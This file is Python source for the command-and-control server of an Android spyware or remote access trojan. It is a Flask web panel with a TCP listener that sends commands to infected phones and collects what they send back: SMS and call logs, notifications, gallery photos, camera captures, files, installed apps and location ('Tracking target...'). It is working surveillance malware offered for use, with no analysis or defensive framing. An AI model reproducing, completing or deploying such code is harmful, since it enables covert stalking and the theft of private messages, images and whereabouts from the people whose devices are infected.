import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename

# --- Globals & Setup ---
app = Flask(__name__)
running = True
server_logs = []
clients = {}
clients_lock = threading.Lock()
file_transfers = {}

UPLOAD_FOLDER = 'uploads'
for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads', UPLOAD_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

def add_log(message):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    server_logs.insert(0, formatted_msg)
    if len(server_logs) > 200:
        server_logs.pop()

def create_initial_ui_data():
    return {
        "sms_logs": [], "call_logs": [], "file_manager": {"path": "/", "files": []},
        "gallery": {"page": 0, "files": []}, "notifications": [], "apps": [],
        "device_info": {}, "location_url": None, "camera_image": None,
    }

# --- Data Handlers ---
def handle_incoming_data(data, client_id):
    with clients_lock:
        if client_id not in clients:
            return
        try:
            payload = json.loads(data).get('data', {})
            log_type = payload.get('type', 'UNKNOWN')
            client_data = clients[client_id]['ui_data']

            # Reset data on new requests
            if log_type == 'GALLERY_PAGE_DATA':
                client_data['gallery']['files'] = []

            # Simplified logic for data handling
            def handle_no_more_pages(p):
                client_data['gallery']['page'] = max(0, client_data['gallery']['page'] - 1)
                add_log(f"[{client_id}] No more pages in gallery.")

            handler_map = {
                'SMS_LOG': lambda p: client_data['sms_logs'].extend(p.get('logs')),
                'CALL_LOG': lambda p: client_data['call_logs'].extend(p.get('logs')),
                'DEVICE_INFO': lambda p: client_data['device_info'].update(p.get('info')),
                'APP_LIST': lambda p: client_data['apps'].extend(p.get('apps')),
                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager'].update(p.get("listing")),
                'SHELL_CD_SUCCESS': lambda p: client_data['file_manager'].update({"path": p.get("current_dir"), "files": []}),
                'GALLERY_PAGE_DATA': lambda p: client_data['gallery']['files'].extend(p.get("files")),
                'GALLERY_NO_MORE_PAGES': handle_no_more_pages,
                'NOTIFICATION_DATA': lambda p: client_data['notifications'].insert(0, p.get("notification")),
                'LOCATION_PENDING': lambda p: client_data.update({"location_status": "pending", "location_msg": p.get("status")}),
                'LOCATION_FAIL': lambda p: client_data.update({"location_status": "error", "location_msg": p.get("error")}),
                'LOCATION_SUCCESS': lambda p: client_data.update({
                    "location_status": "success", 
                    "location_url": p.get("data", {}).get("url") if isinstance(p.get("data"), dict) else p.get("url"),
                    "location_image": p.get("data", {}).get("image_url") if isinstance(p.get("data"), dict) else None
                }),
            }

            if log_type in handler_map:
                handler_map[log_type](payload)
                add_log(f"[{client_id}] Received {log_type}")
            elif 'CHUNK' in log_type or 'END' in log_type:
                handle_file_transfer(payload, log_type, client_id)
            else:
                add_log(f"[{client_id}] Agent Msg: {log_type} - {payload.get(list(payload.keys())[1]) if len(payload.keys()) > 1 else ''}")

        except Exception as e:
            add_log(f"[ERROR] Parsing data for {client_id}: {e} | Raw: {data[:200]}")

def handle_file_transfer(payload, log_type, client_id):
    global file_transfers
    if 'CHUNK' in log_type:
        chunk_data = payload.get('chunk_data', {})
        filename = chunk_data.get('filename')
        if filename:
            file_transfers.setdefault(filename, []).append(chunk_data.get('chunk'))
    elif 'END' in log_type:
        filename = payload.get('file')
        if filename and filename in file_transfers:
            folder = 'device_downloads'
            if 'GALLERY' in log_type: folder = 'gallery_downloads'
            if 'CAMERA' in log_type: folder = 'captured_images'
            
            save_path = os.path.join(folder, secure_filename(filename))
            try:
                full_base64_data = "".join(file_transfers.pop(filename))
                with open(save_path, 'wb') as f:
                    f.write(base64.b64decode(full_base64_data))
                add_log(f"[DOWNLOAD] {client_id} saved {filename} to {save_path}")
                
                with clients_lock:
                    if 'GALLERY' in log_type:
                        clients[client_id]['ui_data']['gallery']['view_image'] = save_path
                    if 'CAMERA' in log_type:
                        clients[client_id]['ui_data']['camera_image'] = secure_filename(filename)
            except Exception as e:
                add_log(f"[ERROR] Saving file {filename} from {client_id}: {e}")

# --- TCP Server (Background Threads) ---
def handle_client_connection(conn, client_id):
    add_log(f"[+] Agent Connected: {client_id}")
    buffer = ""
    try:
        add_log(f"[DEBUG] Client {client_id} entering data reception loop.")
        while True:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                add_log(f"[DEBUG] Client {client_id} sent no data (graceful disconnect).")
                break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip(), client_id)
    except (ConnectionResetError, BrokenPipeError, TimeoutError) as e:
        add_log(f"[DEBUG] Client {client_id} connection error: {e}") # Expected when client disconnects due to network issues
    except Exception as e:
        add_log(f"[ERROR] Unexpected error in client {client_id} connection handler: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        add_log(f"[-] Agent Disconnected: {client_id}")
        conn.close()

def tcp_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_port = int(os.environ.get("TCP_PORT", 8888))
    server.bind(('0.0.0.0', tcp_port))
    server.listen(5)
    add_log(f"[*] TCP Server listening on port {tcp_port}")
    while running:
        try:
            conn, addr = server.accept()
            client_id = f"{addr[0]}:{addr[1]}"
            with clients_lock:
                clients[client_id] = {
                    'socket': conn,
                    'ui_data': create_initial_ui_data()
                }
            threading.Thread(target=handle_client_connection, args=(conn, client_id), daemon=True).start()
        except Exception as e:
            add_log(f"[!] TCP Listener Error: {e}")

# --- Web Routes ---
@app.route('/')
def index(): return render_template('index.html')

@app.route('/location')
def location_page(): return render_template('location.html')

@app.route('/api/status')
def get_status():
    with clients_lock:
        print(f"DEBUG: Clients dictionary content at /api/status: {clients}") # ADDED DEBUG PRINT
        client_list = []
        for cid, client_data in clients.items():
            info = client_data['ui_data'].get('device_info', {}) # Ensure device_info is always a dict
            client_list.append({
                'id': cid,
                'model': info.get('Model', 'Unknown'),
                'battery': info.get('Battery', 'N/A'),
                'info_str': f"{info.get('Manufacturer', '')} {info.get('Model', '')} (Android {info.get('AndroidVersion', '?')})"
            })

    return jsonify({"logs": server_logs, "devices": client_list})

@app.route('/api/client_data/<client_id>')
def get_client_data(client_id):
    with clients_lock:
        if client_id in clients:
            return jsonify(clients[client_id]['ui_data'])
        return jsonify({"error": "Client not found"}), 404

@app.route('/api/command', methods=['POST'])
def send_command_route():
    json_req = request.json
    client_id = json_req.get('client_id')
    cmd = json_req.get('cmd')
    if not client_id or not cmd:
        return jsonify({"status": "error", "message": "client_id and cmd are required"}), 400

    with clients_lock:
        if client_id not in clients:
            return jsonify({"status": "error", "message": "Client not connected"}), 404
        client_socket = clients[client_id]['socket']
        client_data = clients[client_id]['ui_data']

        # Clear old data for relevant commands
        if cmd == 'getsms': client_data['sms_logs'] = []
        if cmd == 'getcalllogs': client_data['call_logs'] = []
        if cmd == 'list_app': client_data['apps'] = []
        if cmd == 'filemanager' or cmd.startswith('cd '): client_data['file_manager']['files'] = []
        if cmd == 'takebackpic' or cmd == 'takefrontpic': client_data['camera_image'] = None
        if cmd == 'gallery': client_data['gallery'] = {'page': 0, 'files': []}
        if cmd == 'gallery next':
            client_data['gallery']['page'] += 1
            client_data['gallery']['files'] = [] # Clear files for new page
        if cmd == 'gallery back':
            client_data['gallery']['page'] = max(0, client_data['gallery']['page'] - 1)
            client_data['gallery']['files'] = [] # Clear files for new page
        if cmd == 'get_location': 
            client_data['location_url'] = None
            client_data['location_status'] = 'requesting'
            client_data['location_image'] = None
            client_data['location_msg'] = 'Tracking target...'

    try:
        add_log(f"[SEND] to {client_id}: {cmd}")
        
        # Auto-refresh file list after directory change
        full_payload = f"{cmd}\n"
        if cmd.startswith('cd '):
            full_payload += "filemanager\n"
            
        client_socket.sendall(full_payload.encode())
        return jsonify({"status": "success"})
    except Exception as e:
        add_log(f"[ERROR] Failed to send command to {client_id}: {e}")
        # Let the handle_client_connection manage disconnection
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/gallery_images/<path:filename>')
def serve_gallery_image(filename):
    # This route is no longer necessary for thumbnails but can be kept for full-size images if needed.
    return send_from_directory('gallery_downloads', filename)

@app.route('/captured_images/<path:filename>')
def serve_captured_image(filename):
    return send_from_directory('captured_images', filename)

if __name__ == '__main__':
    threading.Thread(target=tcp_listener, daemon=True).start()
    web_port = int(os.environ.get("PORT", 1111))
    add_log(f"[*] Web Server starting on port {web_port}")
    app.run(host='0.0.0.0', port=web_port, debug=False)
